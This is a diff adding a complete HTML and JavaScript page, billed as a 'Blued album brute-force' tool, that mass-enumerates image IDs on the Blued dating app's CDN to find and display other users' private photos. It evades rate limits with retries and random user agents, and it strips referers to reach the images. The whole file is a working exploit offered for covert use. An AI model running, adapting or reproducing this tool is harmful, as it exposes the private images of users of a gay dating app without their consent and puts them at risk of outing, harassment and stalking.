@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blued相册爆破v1.0</title>
+    <!-- 关键：全局去掉Referer，解决查看按钮无效 -->
+    <meta name="referrer" content="no-referrer">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        }
+
+        body {
+            background: #000;
+            color: #fff;
+            min-height: 100vh;
+            padding: 40px 20px;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: rgba(255,255,255,0.08);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-radius: 20px;
+            border: 1px solid rgba(255,255,255,0.1);
+            padding: 24px;
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #999;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+
+        .section-title {
+            font-size: 15px;
+            color: #ccc;
+            margin-bottom: 12px;
+        }
+
+        .option-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .option-btn {
+            flex: 1;
+            padding: 14px 8px;
+            border-radius: 12px;
+            background: rgba(255,255,255,0.06);
+            border: 1px solid rgba(255,255,255,0.1);
+            color: #fff;
+            font-size: 14px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .option-btn.active {
+            background: rgba(255,255,255,0.12);
+            border-color: rgba(255,255,255,0.25);
+        }
+
+        .start-btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.15);
+            color: #fff;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-bottom: 20px;
+        }
+
+        .start-btn:hover {
+            background: rgba(255,255,255,0.15);
+        }
+
+        .progress-wrap {
+            margin-bottom: 20px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 14px;
+            background: rgba(255,255,255,0.08);
+            border-radius: 999px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #34d399, #22c55e);
+            border-radius: 999px;
+            transition: 0.3s ease;
+        }
+
+        .stat-row {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 8px;
+            color: #888;
+            font-size: 13px;
+        }
+
+        #log {
+            width: 100%;
+            height: 260px;
+            background: rgba(255,255,255,0.06);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            padding: 12px;
+            color: #aaa;
+            resize: none;
+            outline: none;
+            font-size: 12px;
+            overflow-y:auto;
+        }
+
+        .log-line{
+            display:flex;
+            align-items:center;
+            gap:8px;
+            margin:4px 0;
+        }
+
+        .view-btn{
+            padding:2px 8px;
+            background:#2563eb;
+            border:none;
+            border-radius:4px;
+            color:#fff;
+            font-size:11px;
+            cursor:pointer;
+        }
+
+        .row {
+            margin-bottom: 16px;
+        }
+
+        .row label {
+            display: block;
+            color: #aaa;
+            margin-bottom: 6px;
+            font-size: 14px;
+        }
+
+        .row input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 10px;
+            background: rgba(255,255,255,0.06);
+            border: 1px solid rgba(255,255,255,0.1);
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #666;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>Blued相册爆破v1.0</h1>
+    <div class="subtitle">作者狐小卿|低调使用切勿传播</div>
+
+    <div class="row">
+        <label>此处粘贴任意头像URL</label>
+        <input type="text" id="urlVal" placeholder="https://www.bldimg.com/userfiles/...">
+    </div>
+
+    <div class="row" style="display:flex;gap:10px">
+        <div style="flex:1">
+            <label>起始ID</label>
+            <input type="number" id="startId" placeholder="0">
+        </div>
+        <div style="flex:1">
+            <label>结束ID</label>
+            <input type="number" id="endId" placeholder="99999">
+        </div>
+    </div>
+
+    <div class="section-title">爆破模式</div>
+    <div class="option-group">
+        <div class="option-btn active" data-mode="full">
+            全局统配<br><small>不漏图</small>
+        </div>
+        <div class="option-btn" data-mode="split">
+            批量探测<br><small>速度快</small>
+        </div>
+    </div>
+
+    <button class="start-btn" id="startBtn">开始爆破</button>
+
+    <div class="progress-wrap">
+        <div class="progress-bar">
+            <div class="progress-fill" id="fill"></div>
+        </div>
+        <div class="stat-row">
+            <div>已处理：<span id="done">0</span></div>
+            <div>成功：<span id="succ">0</span></div>
+            <div>失败：<span id="fail">0</span></div>
+        </div>
+    </div>
+
+    <div id="log"></div>
+    <div class="footer">© 2026 狐小卿</div>
+</div>
+
+<script>
+const TIMEOUT = 2800;
+const CONCUR = 160;
+
+const DOMAIN_LIST = [
+    "https://qn-origin-blued.bldimg.com",
+    "https://www.bldimg.com",
+    "https://www.bldimg.cn"
+];
+const SUFFIX_FULL = ["!original.png","!Head.jpg!original.png","!Head.jpg",""];
+const SUFFIX_SPLIT = ["!original.png","!Head.jpg"];
+
+let filePath = "";
+let startId = 0, endId = 0;
+let processed = 0, successCount = 0, failCount = 0;
+let mode = "full";
+
+const logDom = document.getElementById('log');
+const fillDom = document.getElementById('fill');
+const doneDom = document.getElementById('done');
+const succDom = document.getElementById('succ');
+const failDom = document.getElementById('fail');
+const startBtn = document.getElementById('startBtn');
+
+document.querySelectorAll('.option-btn').forEach(btn=>{
+    btn.onclick=()=>{
+        document.querySelectorAll('.option-btn').forEach(b=>b.classList.remove('active'));
+        btn.classList.add('active');
+        mode=btn.dataset.mode;
+    }
+});
+
+function randUA(){
+    const arr=[
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X)",
+        "Mozilla/5.0 (Android 14; Pixel 8)",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome 124.0"
+    ];
+    return arr[Math.floor(Math.random()*arr.length)];
+}
+
+// 文字+查看按钮（修复无效问题）
+function addLog(id,link){
+    const line = document.createElement('div');
+    line.className = "log-line";
+    const text = document.createTextNode(`ID${id}`);
+    const btn = document.createElement('button');
+    btn.className = "view-btn";
+    btn.innerText = "查看";
+    // 关键：_blank 新标签，配合meta no-referrer
+    btn.onclick = ()=>window.open(link, '_blank');
+    line.appendChild(text);
+    line.appendChild(btn);
+    logDom.appendChild(line);
+    logDom.scrollTop = logDom.scrollHeight;
+}
+
+function addPlain(text){
+    const d = document.createElement('div');
+    d.style.margin="4px 0";
+    d.style.color="#888";
+    d.innerText = text;
+    logDom.appendChild(d);
+    logDom.scrollTop = logDom.scrollHeight;
+}
+
+function resetData(){
+    processed=0;successCount=0;failCount=0;
+    fillDom.style.width="0%";
+    doneDom.innerText=0;succDom.innerText=0;failDom.innerText=0;
+    logDom.innerHTML="";
+}
+function getPath(url){
+    let reg=/\/userfiles\/(\d+\/\d+\/\d+)\/\d+/;
+    let res=url.match(reg);
+    return res?res[1]:null;
+}
+function buildUrls(id){
+    let arr=[];
+    let list=mode==="full"?SUFFIX_FULL:SUFFIX_SPLIT;
+    for(let d of DOMAIN_LIST){
+        for(let s of list){
+            arr.push(`${d}/userfiles/${filePath}/${id}${s}`);
+        }
+    }
+    return arr;
+}
+
+async function checkUrl(url){
+    let h={UserAgent:randUA()};
+    let c=new AbortController();
+    let t=setTimeout(()=>c.abort(),TIMEOUT);
+    try{
+        let res=await fetch(url,{headers:h,signal:c.signal});
+        clearTimeout(t);
+        if([403,429,503,567].includes(res.status)){
+            await new Promise(r=>setTimeout(r,200));
+            let res2=await fetch(url,{headers:h,signal:c.signal});
+            return res2.ok;
+        }
+        return res.ok;
+    }catch{
+        clearTimeout(t);
+        return false;
+    }
+}
+
+async function scanId(id,total){
+    let urls=buildUrls(id);
+    let ok=false,okUrl="";
+    for(let u of urls){
+        if(await checkUrl(u)){ok=true;okUrl=u;break;}
+    }
+
+    processed++;
+    doneDom.innerText=processed;
+    let pct=(processed/total)*100;
+    fillDom.style.width=pct+"%";
+
+    if(ok){
+        successCount++;
+        succDom.innerText=successCount;
+        addLog(id,okUrl);
+    }else{
+        failCount++;
+    }
+}
+
+async function runPool(tasks,limit){
+    let idx=0;
+    async function fn(){
+        while(idx<tasks.length)await tasks[idx++];
+    }
+    let pool=Array(limit).fill(0).map(()=>fn());
+    await Promise.all(pool);
+}
+
+startBtn.onclick=async ()=>{
+    resetData();
+    let url=document.getElementById('urlVal').value.trim();
+    startId=+document.getElementById('startId').value;
+    endId=+document.getElementById('endId').value;
+
+    filePath=getPath(url);
+    if(!filePath){addPlain("错误！请检查URL格式是否正确粘贴");return;}
+    addPlain("开始爆破");
+    startBtn.disabled=true;
+    startBtn.innerText="爆破中...";
+
+    let total=endId-startId+1;
+    let tasks=[];
+    for(let i=startId;i<=endId;i++)tasks.push(scanId(i,total));
+    await runPool(tasks,CONCUR);
+
+    addPlain(`扫描结束失败总数：${failCount}`);
+    failDom.innerText=failCount;
+    startBtn.disabled=false;
+    startBtn.innerText="START";
+};
+</script>
+</body>
+</html>
